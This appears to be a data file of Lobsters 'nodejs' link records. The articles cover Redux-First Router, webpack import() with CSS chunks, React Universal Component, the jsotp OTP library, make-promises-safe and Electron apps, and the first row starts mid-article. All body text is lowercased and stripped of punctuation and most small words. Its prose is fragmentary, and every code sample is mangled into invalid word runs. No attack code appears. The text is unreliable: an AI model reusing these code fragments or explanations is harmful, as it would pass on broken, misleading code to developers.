typical developer traptransition group powerful let circumvent challenge managing multiple overlapping animating component magically let think term one visible component timenext universalcomponenthere universal component shine well switch component without animation speciality following beat universal rendering mean clientside import successful synchronous rendering server seamlessly passed client via webpackflushchunks big deal particular case code sandbox making use clientside capabilitiesbut hey u follow pattern using tool ssr back menuso summary action type name component want displaythe page reducer state contains name component transitiongroup key page name declaratively show component transition without manage temporary overlapthe universalhoc key page name handle dynamic importing need might notice import called dynamic template literal propspage call trickledown hashing keying whatever wan na call one key used level great justice know etymology phrase way honestly grinding hard long missed backstory great many thing missioncritical year take term around come nonnative english speaker maybe france like electronic group justice way lot either way concept stupid simple thing great justice resonates justice need banging head keyboard next redirects srcoptionsjsauth filtering probably one first real hurdle meet rfr nobrainer tooyes like favorite serverside mvc framework filter designated stage stage called onbeforechange reach past pre release deprecated renamed onbeforeaction reason route thunk called thunk terminology matter familiarity matter learn new concept matter shit hard time consuming rfr aim introduce concept possible generally natural extension redux useful piece software pattern ever invented medisclaimer everything write make basically telling story telling u describing sharing worked resonates awesomethe way redirects work import action creator named redirect rfr basically action creator get way primary goal keep api surface minimum action creator necessary simply pas typical action dispatch go route like redirect action know route type routesmap tagged redirectwhen reach middleware everything shortcircuits different action dispatched thing happen well example clientside history replaced rather pushed user end infinite human loop pressing back button etcso open srcoptionsjs see redirect performed certain condition aka filtering onbeforechange filtering sorta stuff used controller favorite mvc new game well everything old new know onbeforechange rfr general c mvc whereas react v redux mhave really missing c time get back mvc condition example isallowed function get passed user state course onbeforechange access since signature pretty much thunk take user current type aka page aka route check user role check role current pagerouteaction targeted toward match let user inimportant onbeforechange get argument dispatch getstate action reason state changed yet know action need use action case determine state state user allowed coexist routesmap happens stored state one many thing get getstate critical juncture dependent next state still important get passed getstate actionand like good redux tool promotes purity since got ta get routesmap global state make sense start using rfr take word natural way stuff happeningwho take anyone word precarious profession called software development anyway thunklevel redirectsselfexplanatory notice arbitrary keyvalues put route ie role also redirect thunk level ie individual route ssr resolve way builtin also dispatch notfound see sandbox action type exposed rfr know know data needed show current pagecomponents reducer respond rfr location reducer respond therefore component easily respond also receive action type user visit url route dispatch action matching path forthere nuance primary one well url show address bar well depends user try directly visit url routesmap handle case url stay like visited nonexistent github repo dispatch action matching route well fallback url specify option called notfoundpath certain condition keep url read doc general actiontoreducer stufflooks like something straight outa redux doc notice route action list paired w async response actionso yea know use redux know use rfr payload params extracted dynamic path segment informational type know rfr prerelease article describes dispatching type historypush missed opportunity missed opportunity rfr nail might add thing checkout playing reducer simply return true actiontype play mean whatever want going forget url even powering thismore importantly look videosbycategory reducer pictured essentially know show spinner current category extracted url video natural followup action route thunk fetch databy way going get significance simplicity single thunk paired route next serious rfr article hint much making life miserable flexibility fancy middleware saga observables even adhoc thunk time one followup async action response trigger action ur lucky happens url split give natural contextual way encode followup action coming soonwhich brings u endhey might well show entry point go next liked photo hope fun sandbox today adventure really lead water tasty water taste like craft beer rather belgian beer favoriteenjoy fella lady cuz know stay coding build future according vision thanks much ives van hoorne ba buursma making super sexy luscious code sandbox think made evolve far likely turn critical many u coding journey wish guy best luck love j react stackwhile ponder begun seep subconscious hopefully play ive amazing code sandbox let instrumental play sexy musicand got ta scroll top pro tip click edit codesandbox top rightstay sexy javascript folk idiomatic javascript reactlandia read still aint newjacktweets love much appreciated find twitter faceyspacey want stay current reactlandia tapclick follow next faceyspacey publication receive weekly medium letter via email
281,Lobsters,nodejs,Node.js programming,Webpack’s import() will soon fetch JS + CSS— Here’s how you do it today,https://medium.com/faceyspacey/webpacks-import-will-soon-fetch-js-css-here-s-how-you-do-it-today-4eb5b4929852,webpack import soon fetch j today,webpack import soon fetch j today tobias koppers new cs workflow extractcsschunkswebpackplugin one cs injection via styleloader one cs injection via styleloader backstory reactuniversalcomponent webpackflushchunks introducing babelplugindualimport extract cs chunk webpack plugin installation conclusion,webpack import soon fetch j todaythe futureupdate august want use babelpluginuniversalimport nowa month ago webpack creator tobias koppers unleashed big plan cs webpack article new cs workflow primary takeaway mine least codesplitting cs would become first class priority would able get cs file generated dynamic code splitting chunk call import would get file j cs quote article big planin long term want make possible add firstclass module support cs webpack work following way add new module type webpack stylesheet next javascript adjust chunk template write two file one javascript one stylesheets cs file adjust chunk loading logic allow loading stylesheets need wait cs applied least loaded executing jswhen generate chunk load may load j chunk stylesheet chunk parallel combined promiseall foundation course able cs file generated dynamic chunk currently extracttextwebpackplugin support beta version circulating today support extractcsschunkswebpackplugin around still good enoughit good enough compilation slow maximize caching within browser reason creates different j chunk one chunk chunk one without cs injection via styleloaderone cs injection via styleloaderthe reason initial servingrendering get minimal set byte cacheable stylesheets future call import missing cssbackstoryfor make sense first time hearing probably want check summary via reactuniversalcomponent webpackflushchunks easily universally render app simultaneously codesplitting first time generally available npm package framework required know takeaway ssr solved problem splitting solved problem together beenyou longer trade seossr codesplitting vice versathat also mean primary mechanism conserving byte delivered client codesplitting get full benefit want sending private member panel cs public visitor vice versa multiple area app problem compoundsin fact statically split cs sending le byte client popular render path solution du jour since send definition cs j chunk addition cs perhaps importantly also save many wasted cycle generating cs render server clientbeing able control static cs file send client really nice way handle problem sokra came conclusion able automatically even betterintroducing babelplugindualimport extract cs chunk webpack plugin transforms request promiseall sokra talked bonus automatically come webpackchunkname magic comment magical disappeared hood course use generate chunk namesas extractcsschunkswebpackplugin well circumvented major performance issue term build time double j chunk dealing stylesheets user browser cache yes hmr still work better ever fact also note package work together tentatively calling universal family package individually used flexible frameworkless development work best together enjoyinstallationsince today primarily introducing babel plugin focus yarn add dev babelplugindualimportbabelrc presets whatever usually plugins dualimport appjs import foojs importcss babelplugindualimportimportcssjspromiseall import webpackchunkname foo foo importcss foo promise promise using dynamic requires import base page importcss babelplugindualimportimportcssjspromiseall import webpackchunkname base request base page importcss base page promise promise course need use extractcsschunkswebpackplugin generate dynamic cs chunk webpackflushchunks seamlessly serve skip webpack plugin config serve asset corresponding rendered component import flushchunks webpackflushchunksimport universal reactuniversalcomponentserverconst appstring reactdomrendertostring app const j style csshash flushchunks webpackstats chunknames universalflushchunknames ressend html head style head body div idroot appstring div j csshash body html looked webpackflushchunks work new addition csshash similar webpack put bootstrap script mapping javascript chunk id csshash map cs chunk name stylesheet file babelplugindynamicimport request stylesheets parallel javascript importsconclusionthere much left say today waste time git clone demo see package action checked react universal component webpack flush chunk currently solution bringing together react developer apprehensive framework developer problem know day overall link one place
284,Lobsters,nodejs,Node.js programming,chalk/chalk 2.0 released,https://github.com/chalk/chalk/releases/tag/v2.0.0,chalkchalk released,,
285,Lobsters,nodejs,Node.js programming,"jsotp - a node module to generate and verify one-time password, based on RFC4226(HOTP) and RFC6238(T",https://github.com/LanceGin/jsotp,jsotp node module generate verify onetime password based hotp,jsotp example feature installation module usage timebased otps counterbased otps generate random encoded secret api contribute,jsotp jsotp node module generate verify onetime password used implement mfa authentication method web application loginrequired system module implement based hotp hmacbased onetime password algorithm totp timebased onetime password algorithm example feature generate random encoded string generate otpauth url encoded string create hotp object verification verify hotp token create totp object verification verify totp token installation module module support const jsotp require jsotp usage timebased otps import const jsotp require jsotp create totp object const totp jsotptotp totpnow verify current time totpverify true verify totpverify false counterbased otps import const jsotp require jsotp create hotp object const hotp jsotphotp hotpat hotpat hotpat verify counter hotpverify true hotpverify false generate random encoded secret import const jsotp require jsotp generate const api param length type int default return string desc length random encoded string param secret type string return totp desc generate totp instance return string desc get onetime password current time param totp type string return boolean desc verify totp code param issuer type string return string desc generate url totp instance param secret type string return hotp desc generate hotp instance param counter type int return string desc generate onetime password counter param hotp type string param count type int return boolean desc verify hotp code param issuer type string return string desc generate url hotp instance contribute clone repo install dependency git clone git githubcom lanceginjsotpgit npm install contribute code src run command build code create local directory named lib
286,Lobsters,nodejs,Node.js programming,mcollina/make-promises-safe: make promises safe from memory leaks in node <= 8,https://github.com/mcollina/make-promises-safe,mcollinamakepromisessafe make promise safe memory leak node,makepromisessafe important module used toplevel program code reusable module problem using promise attach handler synchronously solution install usage preloader core dump custom logging license,makepromisessafe nodejs module make use promise safe implement deprecation nodejs version using promise without module might cause file descriptor memory leak important module used toplevel program code reusable module problem nodejs crash uncaught exception crash unhandledrejection ie promise without catch handler using promise attach catch handler synchronously example following server leak file descriptor missing catch handler const http require http const server httpcreateserver handle serverlisten function handle req re dostuff body resend body function dostuff mathrandom return promisereject new error kaboom return promiseresolve hello world solution makepromisessafe installs processon unhandledrejection handler print stacktrace exit process exit code like uncaught exception install npm install makepromisessafe save usage use strict require makepromisessafe installs unhandledrejection handler const http require http const server httpcreateserver handle serverlisten function handle req re dostuff body resend body function dostuff mathrandom return promisereject new error kaboom return promiseresolve hello world preloader add behavior nodejs application using preloader node r makepromisessafe serverjs core dump also create core dump unhandled rejection occurs require makepromisessafe abort true custom logging add custom logger log error format override logerror property function take single error parameter default consoleerror const makepromisessafe require makepromisessafe makepromisessafelogerror function err log err object license mit
287,Lobsters,nodejs,Node.js programming,Pre Release: Redux-First Router — A Step Beyond Redux-Little-Router,https://medium.com/@faceyspacey/pre-release-redux-first-router-a-step-beyond-redux-little-router-cd2716576aea,pre release reduxfirst router step beyond reduxlittlerouter,react redux routing reduxlittlerouter reduxlittlerouter work primary way use allows make decision one place reducersselectors kind state three part series let url talking problem reduxlittlerouter get right interlude intelligent action type solution dispatching locationchanged type precise missed opportunity flux standard action minimal routing api surface history history lesson trying fit square peg round whole time time truly best design would undertake deal url bye bye nested route aside switch type check routing easy part related task powerful reduxfirst router conclusion reduxfirst router capability list codesplittingprefetching la react universal component webpack flush chunk p idiomatic javascript reactlandia read,purpose article debunk effectiveness routematching component nested route using redux discovering better simpler obvious wayas conscious developer realize goal fact staying conscious specifically mean staying alert blind spotsour blind spot trap lead u taking longer le intuitive development path obvious betterfaster way within capability seeingas result always looking faster intuitive way thingsit surprise every monthsyearsdays find confronted fact better way doingsometimes evolution profound lead entire development community switching thing case react reduxtoday going propose thing routing yes heard le sexy supposedly solved problem reinventing year language language framework framework following status quo paying price itreduxlittlerouterwe going start journey understanding problem looking best thing come routing redux using redux react router still recommended solution article strictly redux developershow reduxlittlerouter work taking example readme start defining nesting route like const route user title user user slug title user profile nested route home title home repos title repos slug title repo typical redux router yes many caught compose custom middleware reducer enhancer const reducer middleware enhancer routerforbrowser const reducer combinereducers router reducer others const enhancer compose enhancer applymiddleware middleware const store createstore reducer enhancer lastly setup provider import provider reactreduximport routerprovider reduxlittlerouterimport configurestore configurestoreconst store configurestore reactdomrender provider store store routerprovider store store yourappcomponent routerprovider provider documentgetelementbyid root primary way use change url result corresponding action dispatched push usersjamesgillmore foobar conditionally render something using routematching component fragment thing route react router fragment forroutehomerepos slug code repo connectedrepo fragment create real link seo link hrefhomereposreactuniversalcomponent go react universal component link also nest fragmentsroutes like react router example readme fragment forroutehome div home fragment forroutebio div bios fragment forroutedatboi div dat boi p something something whaddup p div fragment div fragment div fragment one thing note example page called homebio show bios obviously goal snippet show page url homebiodatboi similar react routerbefore continue important look action dispatched allow type locationchanged action pathname homereposreactuniversalcomponent route homerepos slug params slug reactuniversalcomponent query foo bar search foobar result title repos parent title repos parent title home lastly location state stored router state key used power fragment pathname homereposreactuniversalcomponent route homerepos slug params slug reactuniversalcomponent query foo bar search foobar result title repos parent title repos parent title home previous pathname homerepos route homerepos params query result title repos parent title repos state replica recent action previous actionbefore move way important insure everyone speedbasically instead react router separate state store redux state power fragment component connected state via reactredux connect method well context provider top level app also issue address todaythis allows standard redux pattern tool may use reselect async middleware need know url state etc allows make decision one place reducersselectors kind state also prevents inconsistency resulting different set state prop component receive react router problem go much reduxlittlerouter levelup react router came gun blazing explaining problem using react router redux three part series called let url talking summary combining state react router redux unpredictable couple view layer state complicates producing refined state combination url state redux state many case make impossible using react router redux really need alternate reduxfirst solution believe make sure read let url talking series problem rather lot problem unfortunate react router great make little sense redux appsso going forward going assume agreement generally like seeing reduxlittlerouterso problem reduxlittlerouter rather better one mean repeat constantly tap address bar path component dry secondly change apps urlspaths change everywhere code importantly mean littering codebasecomponenttree lot additional nestingpaths also subject change whereas job use wellnamed variable ie state key stick around long time bulk codebase would better comprised symbol variable carefully choose change client chose long ago beginning though driving factor wanted get thing waywhat get rightwhat reduxlittlerouter get right though bidirectional transformation action url url action way embodied blue twoway arrow graphic top page also get right rich action information specifically dynamic segment path transformed params use path params real damage read useful stuff reducer though type always locationchanged type unfortunately basically useless going locationchanged timeas result still must depend fragment could get type something relevant params nice know correspond reducer crippledwell could write lot reducer code analyze path mean expend computation cycle execute think anybody least nearly enough itinterludeas far redux developer concerned using route fragment carryover bygone era react router routematching component make whole lot sense nothing else make decision based doconditionally rendering based kind state url regular redux state still solved fragment example want show something url user user fetched stored reduxand informational compared infinite custom logic come reducersthe realization used fullest get soon global reactive state tree completely replaces need routematching component like route react router fragment reduxlittlerouter read againyour redux state completely wipe need route matching component pick one need keep mind talking initial problem reduxlittlerouter solved regarding predictable single source truth talking problem reduxlittlerouter carried react router daysusing route fragment carryover bygone era react routerintelligent action type solutionso make state informational effective enough go without routematching component well derive value action dispatching locationchanged type precise missed opportunity type need correspond url solution simple const routesmap repo homerepos slug user user slug post post id home assign type path matter value slug example corresponding action receives type paired story pas go collect url address bar dispatch action dispatch action like dispatch type repo payload slug reduxfirstrouter dispatch type user payload slug jamesgillmore dispatch type post payload id dispatch type home setup routesmap configure store virtually zero good thing api surface dispatch flux standard action use connect address bar handled youyour link look like link hrefusersjamesgillmore link href type post payload id best option link href user slug usersjamesgillmore sneakpeak using reactuniversalcomponent webpackflushchunks link prefetch href type post payload id const slug getslugfromsomewhere using action href allows path defined single place reducer look like following let take user action type example const userslug state action actiontype user actionpayloadslug state also need following type need url const userscache state action actiontype usersloaded actionpayloadusers stateand let connect component const user user div username div real app obviously use reselect memoizationconst mapstate userslug slug userscacher user user user slug export default connect mapstate user use like const app div usercomponent div let sink inhere another kind reducer likely const page state action switch actiontype case home return homescene case post return postscene case repos return reposscene case repo return reposcene case user return userscene return state corresponding component const pagecomponent page const page page page return page page null const mapstate page page export default connect mapstate pagecomponent could switch cached const page homescene homecomponent postscene postcomponent reposscene reposcomponent reposcene repocomponent userscene usercomponent pagecomponent usage const app div header pagecomponent prop connected footer div note using pagecomponent similar stacking route component point component main difference manually flexibly use redux state make determinationtake second grok get cup coffee got ta let know comment agree done already referring switch hash reffering url paired typesfrom perspective painfully obvious action type corresponding path combination statedriven urldriven apps handled one thing simple believe overlooked solution perfect impedance match problem environment need solved keeping routing state view layer even keeping reducer getting rid wonder directly use information path incoming url query etc component minimal routing api surfacewith routematching component table let take look strip already little reduxlittlerouter push usersjamesgillmore change url result corresponding action action dispatched conversely reduxfirst router let dispatch flux standard action middleware par convert url pushed address bar essentially opposite reduxlittlerouter way applying existing redux app insanely easy matter matching url main type push replace go related imperative method carried history package removedroutematching component like fragment know go tooannoying provider nobody like besides redux course like routerprovider query search need since apps take seo seriously use path really need save async action dispatch also need nested route nested route arguably complex feature reduxlittlerouter another carry react router also get rid nested route though implication discus get rid history lesson order history lessonwhat happened react router came novel idea everything component even route routing extremely useful world without redux state allows developer use paradigm used component everywherewhere opinion thing went wrong redux developer tried apply concept needed amount trying fit square peg round whole yet happens time project try apply read force built aka hard work previous knowledge new scenario wrong tool jobi say yet let url talking series us metaphor evolved platform pointboth react router littlereduxrouter force upon concept nested route convince need themit imposing design decision app without even knowing instead state x render state render breact router famously declares following documentation ever noticed app series box inside box inside box also noticed url tend coupled nesting route nesting resulted never sat well time decision binary show sidebar showsidebar sidebar time pick one scene set using switch hash time logic usually equivalent else branch another binary hashlastly often level deep app level path segment add additional view page want touch concept last bullet pointlet take example reduxlittlerouter top article readme url homebiodatboihow often render bios nothing come good example good sign know usecase implying though better example post show post list post slug show post profilenested routematching component better solution state represent flatly redux freely flexibly tap adhoc style via connect remove coupling view layer url reduxlittlerouter heralded couplingremoval benefit without routematching component take step fartherbut truly case using redux useful react router following doc yes box within box let break nested within path gain benefit knowing display nav bar binary decision navigated repos learn need display sidebar binary decision go figure go primary box switch hash route look like way route path component app route path repos component repos route path component route seriously telling best way build app aware url wherever go able change future one place use variable path prop lol note straw man example easy take break app small connected component supposed redux look like vast majority time within componentis build native apps whenif care url truly best design would undertake deal url unnecessary concept addition besides sidebar navbar apps url lead differently designed page sure maybe react router promotes user experience page containing bios apps like ie maybe thing see valuebye bye nested routesroutematching component geared towards nested environment component tree however thing right connecting redux state component tree flat experience far individual component concernedtherefore got rid routematching component also get rid reduxlittlerouter nesting feature route map arguably complex feature however relies premise action informative type without informative type reducer make full use action dispatched result reduxlittlerouter need nested route route map fill missing informationdo really need indicate title something route map reducer know type want title dynamic static string reduxlittlerouter seems support great rather ability combine dynamic value payload params interpolate string easily without action type periodin short nested route within route map useless opinion also done major disservice adoption otherwise closest thing true version react router redux primarily nested route first thing see readme complicated scare people away first thing user need see opinion simplest powerful thing defines package defining feature opinion like fragment confuses user thinking somehow core solution problemin summary nested routing feature exists fragment feature exists solution without one cancel poof longer exist cross need nested route list tooaside switch people often say switch answer routing redux truth routing come many relatedcoupled responsibilitieswhen hear people say switch feel like get essence think developer come conclusion come right conclusion done disservice undermining perhaps word subliminally conveys powerful routematching component perspective farther form truth reducer powerful reducer combined tool like reselect offer far caching performance benefit brings u another pointlike react router reduxlittlerouter rerenders virtual dom every location change toplevel provider reactredux jump many hoop rerender componentlevel one reason performant rerenders leaf node important userland also jump hoop mapstateforprops function must writeto clear everything described applies world redux appsite use redux react router get right initial issue older version react router let url talking series pointed pas prop route component react router since since solved providing render child prop take inline function reduxfirst router redux react router reacttypes check routing easy read let url talking series probably stumbled part regarding redux doc portray routing easy creator reduxlittlerouter agree true difference centralized computersciencey problem rather neverending laundry list related task must done rightthings scroll restoration redirects datafetching chunk prefetching android backhandler native list go timeconsuming thing developer contrary easy redux doc initially portrayed itif react come importance redux routing close behind react router popular played central role many appsit funny taken longer click declarative ui unidirectional dataflow react single immutable state store serializable action pure function redux many time great developer reimplement router questiona powerful reduxfirst routerso would make reduxfirst router powerful feature neverending list routerrelated task reduxfirst router check well one automatically resolve thunk corresponding action dispatched also resolve server part ssr render appconst thunk async dispatch getstate const slug getstate locationpayload const data await fetch apiuser slug const user await datajson const action type userfound payload user dispatch action const routesmap user path user slug thunk similarly idiomatic way deal route found redirects server clientit work well apollo case likely need thunk feature need itit first class support react native linking api android backhandlerit scroll restoration plugins web react native plugins bloat webbuild need themit also firstclass support react navigation another plugin happens working recently done still need test boilerplate check get definitely subject another post basically react navigation similarly fulfills real need really excited mean think similarly groundbreaking let judge conclusionwith core realization way going close listing vast number capability reduxfirst router covering another timereduxfirst router capability list serverside renderingscroll restorationredirects nativefirstclass react navigation support entry stateimperative api based history packageautomatic datafetching via route thunk cover depth along ssr future react native backhandler supportreact native linking api supportmandatory link component seotransition change callbacksautomatic title managementautomatic backnext detectioncodesplittingprefetching la react universal component webpack flush chunk wondering link prefetch work work like const routesmap home post post id user path user slug chunk import user yes route object string obviously several route option available example frompath topath function provide bidirectionally transform path dynamic segment value see doc learn option availablebut importantly dat chunk option tho yup prefetching dynamic import nextjs guessed coupling redux first router react universal component truth worked far far longer put production first month ago wanted present along prefetching codesplitting really make thing pop know sayinggive spin feel free comment one love j peace tweet love much appreciated link idiomatic javascript reactlandia read tweet love much appreciated find twitter faceyspacey want stay current reactlandia tapclick follow next faceyspacey publication receive weekly medium letter via email
288,Lobsters,nodejs,Node.js programming,How to use Webpack’s new “magic comment” feature with React Universal Component + SSR,https://medium.com/webpack/how-to-use-webpacks-new-magic-comment-feature-with-react-universal-component-ssr-a38fd3e296a,use webpack new magic comment feature react universal component ssr,part using magic comment create chunk step create universalcomponent resolve option babel requireresolveweak quick summary option step flushing chunk low level api correct webpack configuration faq creating hocs without magic comment issue tobias koppers important preloading component trigger loading component fetch data creating cs chunk extractcsschunkswebpackplugin conclusion frictionless capability serf purpose nextjs ladder abstraction async trade ssr asynconly splitting stay tuned boilerplate idiomatic javascript reactlandia read,part using magic comment create chunksstep create universalcomponent put webpack chunk name use need component package let mark considered chunk used calling import magic comment easy part need react component also register usage chunk name reactuniversalcomponent via chunkname option import react reactimport universal reactuniversalcomponentconst asynccomponent import webpackchunkname anything mycomponent const universalcomponent universal asynccomponent resolve requireresolveweak foo chunkname anything export default div universalcomponent div important part string provide webpackchunkname must match chunkname option notice anything bit redundant former static comment much perspective expending line least worry thankful feature finally webpackwhat nuanced though asynccomponent called well could provide standalone promise rather function eg import without arrow function part client would make additional request get component immediately page load even render guarding promise function guarantee called universalcomponent rendered react universal component handle internally youbut resolve option ultimately ultimate trick give webpack server synchronous way require component without client including parent chunk dependency see resolve require foo existence main webpack would include code trying move another chunk would defeat purpose codesplittingin addition requireresolveweak used client page load app rendered first time correctly provided corresponding chunk per part avoids react checksum mismatch lead additional render importantly prevents unnecessary second request chunk corresponding already rendered correctly ssrsee even correctly rendered component want split server via rendertostring sent client client would soon replace loading component mainjs expects render fetch chunk anyway goodbut babel requireresolveweak using babel server must also provide absolute module path const universalcomponent universal asynccomponent resolve requireresolveweak foo chunkname anything path pathjoin dirname foo rest left react universal component dynamically toggle using one method importing module depending environmentthe universal hoc take several option optional learn visit quick summary option error optional error componentloading optional loading componentkey used find export want given moduleonload used take export module thing like replace reducersmindelay controlled delay prevent jank switching loading component primary componenttimeout maximum loading time error component showschunkname name chunk flushed renderedstep flushing chunksif done correctly point flushing chunk matter making additional require serverrender calling parameter import flushchunks webpackflushchunksimport universal reactuniversalcomponentserverconst appstring reactdomrendertostring app const j style flushchunks webpackstats chunknames universalflushchunknames bootstrap vendor main ressend html head style head body div idroot appstring div j body html key thing recognize way node work ie regarding event loop way rendertostring work ie synchronously perform synchronous action immediately make use global state namely arrayssets behind scene containing chunknames guarantee reset queued request flushchunknames clear set chunk name recorded render result annoying react provider component necessary make sure call await kick promise calling ressendas original example part obviously use universalflushchunknames way corresponding work get script stylesheets manually webpackflushchunks also low level api simplify thing semimanual route well specifically give file rendered chunk without addressing file ordering creating stringscomponents getting mainvendor script etcthe important thing need correct webpack configuration make sure check section docsfaqthe previous section designed easyreading perhaps familiar stuff perusing code example meat really answer following question may creating hocs almost everywhere want codesplitting want dynamically bunch section siteapp time want hit bunch bird stone accomplish following function createuniversalcomponent page return universal import page page resolve requireresolveweak page page import longer need function since within function called render time magic comment left readability know webpackflushchunks work without magic comment using moduleids retrieve universalflushmoduleids achieve older version webpack way implement bit different since know page want render render time let give look const myparentcomponent page const universalcomponent createuniversalcomponent page return div universalcomponent div create hoc reuse perhaps entire codesplitting need apps lot byte saving client way cheaper developer price ever importantly ssr longer tradeoff makethere one problem currently requireresolveweak resolve dynamic import like import ie string page page part path dynamic already know webpack perfectly capable way handle creating chunk every module page folderi created issue tobias koppers recently prioritized important vote want fixedhere accomplish likely similar past without ssr const universal import resolve requireresolveweak const universal import resolve requireresolveweak const universal import resolve requireresolveweak const page const createuniversalcomponent page page page implementation myparentcomponent beforeone thing note performance characteristic actually le work render time since component precreated essentially sacrificing memory cpu critical point time measured many cyclesmilliseconds creating component every render probably negligible definitely looking forward initial hoc implementation also reduce work render creating component lifecycle method componentwillmount componentwillreceiveprops set state option herethe main takeaway want capability dynamically choose universal component renderin future likely offer interface well const create universal page import page page resolve page requireresolveweak page page path page pathjoin dirname page page const universalcomponent create universalcomponent page page even need create hocs avoid wasting precious cpu cycle render time best preloading component often time user option navigate want preload option optimize experience like import universal reactuniversalcomponentconst universalcomponent universal import componentsfoo resolve requireresolveweak foo export default class mycomponent extends reactcomponent componentwillmount universalcomponentpreload render return div thispropsvisible universalcomponent div trigger loading component fetch data covered little article loading error component react universal component display needed obvious capability trigger say fetching data parent component intuitive save repeating example using apollo asynchronous hocs const universaluser universal import user resolve requireresolveweak user loading loading const user loading error user div universaluser isloading loading error error user user div export default graphql gql query currentuser user id name prop ownprops data loading error user loading error user user accomplishes beyond code reuse le jank term switching loading component primary universal component universaluser show loading async import resolve data returned graphql server operate parallel going route separate spinner save trap wellas server course use apollo amazing recursive promise resolution solution populate component tree data requires universaluser resolve synchronously split second combine nicely creating cs chunk anyone successfully done codesplitting without ssr know javascript chunk well new hotness const extractcsschunks require extractcsschunkswebpackplugin moduleexports module rule test cs use extractcsschunksextract use loader cssloader option module true localidentname name local hash plugins new extractcsschunks look familiar took lot work reorient plugin extractcsschunkswebpackplugin also support hmr cs something original extracttextwebpackplugin lot well given configure matching server environment either babel webpack create chunk inject j chunk removed since stylesheets already etc coming still remaining piece puzzle missing namely ability generically fetch data along multiple import asynccomponent function see contain call import able specify data dependency promise perform calculation even call import multiple time think sort frictionlessness evolve platformthis capability serf purpose nextjs getinitialprops const asyncwork async prop const prom await promiseall import user import post fetch user id propsid const user prom default const post prom default const data await prom json return user data data prop post user const universalcomponent universal asyncwork universalcomponent id notice requesting chunk fetching data parallel able code component without friction like without worry tradeoff regarding ssr v codesplitting future read bret victor ladder abstraction article know importance thing becoming frictionless platform evolve recently kinda stalled able get full use platform certain place thing place constrained even current reactuniversalcomponent hoc solution accomplish asyncwork asynconly trade ssr asynconly splitting absolutely casethat said reactuniversalcomponent remain important even ifwhen aforementioned problem solved always leg solution recurse component tree resolving promise simple fact need waste cycle server prerender find promise however next week releasing best world decide based need everything covered stay continue use exactly seen today developer like fetch data componentwillmount exciting thing coming way stay tuned boilerplate checkout boilerplate frictionless try thing either webpack babel server without magic comment idiomatic javascript reactlandia read tweet love much appreciated find twitter faceyspaceyno time help contribute want give back way become backer sponsor webpack donating open collective open collective help support core team also support contributor spent significant time improving organization free time
289,Lobsters,nodejs,Node.js programming,Node occasionally gives multiple files/folders the same inode (Issue still open),https://github.com/nodejs/node/issues/12115,node occasionally give multiple filesfolders inode issue still open,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
290,Lobsters,nodejs,Node.js programming,Desktop apps examples built with Electron (JS),https://brainhub.eu/blog/7-famous-desktop-apps-using-electron/,desktop apps example built electron j,electron j apps electron electron take care hard part electron mac window linux reason many great company using electron framework electron j electron j first torrent client working browser webtorrent us electron electron lightweight adfree open source electron j desktop apps using electron electron framework seamless crossplatform experience wordpress desktop us electron react fully hackable ghost desktop us electron ghost desktop app make easier ever nodejs ghost desktop electron deliver better user experience designed hacker beaker browser us electron minimal iteration best way pexels desktop app obviously built electron j pexels desktop us electron slack desktop macos slack desktop us electron built electron framework faster performance frameless look nodejs electronjs downloaded messenger app whatsapp desktop us electron electron framework electron j apps nodejs electron j resource,witness revolution building apps website becomes easier every single day electron j apps definitely part revolution case still know electron framework apps using prepared thorough analysis electron j electron framework creating desktop application emerging technology including javascript html cs basically electron framework take care hard part focus core application revolutionize design designed opensource framework electron combine best web technology crossplatform meaning easily compatible mac window linux come automatic update native menu notification well crash reporting debugging profiling reason many great company using electron framework many developer best way understand electron j see practice manner listing popular example desktop apps using framework webtorrent desktop app let face love torrent whether downloaded mobile desktop screen however type apps still feel bit outdated old guy webtorrent decided step action using electron j basic developing program result webtorrent first torrent client working browser one completely written javascript us webrtc peertopeer transport without plugins extension installation required webtorrent link user decentralized browsertobrowser network ensures efficient file transfer webtorrent us electron electron step action webtorrent desktop version making lightweight adfree open source possible also aid streaming act hybrid client connects app popular bittorrent webtorrent network wordpress desktop app true king content management system wordpress deserved desktop version reliable automated thanks electron j entered list desktop apps using electron opensource framework help user manage wordpress content know wordpress launching via browser however wordpress desktop something entirely new desktop app using electron framework provides seamless crossplatform experience allowing user focus content design without browser tab acting distraction wordpress desktop us electron locally hosted minimal load time wordpress desktop desktop app using electron framework javascript using react main language emerging desktop technology ghost desktop app never heard ghost one basically ghost fully opensource platform let user build run modern online publication blog magazine journal ghost fully hackable real impact future online medium mostly simpler focused experience writing obviously product javascript desktop framework among technology ghost desktop us electron speaking ghost desktop desktop app using electron j allows writer manage multiple blog focus writing writer probably know simple thing like shortcut writing hard realize browser however ghost desktop app make easier ever using javascript nodejs backend frontend ghost desktop one apps built electron one deliver better user experience beaker browser looking reliable peertopeer web browser yes found beaker browser participatory browser designed hacker initially designed product hacked beaker browser shift web opensource format let hacker modders creative type make digital skill beaker browser us electron electron framework made building beaker lot easier toolkit making browser aided designing process electron minimal iteration best way possible nutshell beaker browser browser opensource website solution make social hacking easier better ever pexels desktop app lot writer designer publicist pexels lifesaver platform pack thousand royaltyfree stock image definitely needed improvement pexels desktop app born obviously built electron j pexels desktop us electron app make easier ever copy photo clipboard one click paste photo app use stock image article infographic social medium post downloads mean problem discovering new photo easy thanks pexels desktop app slack desktop another great desktop app using javascript desktop framework slack desktop macos slack desktop us electron built electron framework easily seen thanks faster performance frameless look unlike browser experience many team looking better organization focused workspace slack desktop definitely app choose although slack desktop take hybrid approach asset code loaded remotely combining rendering engine chromium nodejs runtime module system whatsapp desktop app another one line popular desktop apps using electronjs whatsapp downloaded messenger app whatsapp desktop us electron working le providing electron framework helped whatsapp developer cover single cost wrap around desktop experience whatsapp streamlined revolutionized framework electron final word end many reason use create electron j apps desktop important one obviously fast transition desktop environment allowing developer seamlessly integrated experience improved runtime great integration javascript nodejs electron j make designing desktop apps maintaining cross platform easier better resource http githubcomautomatticwpdesktop image http blogghostorg image http wwwpexelscom image http wwwwindowscentralcomslacksdesktopappnowavailablewindowsstore image http len image
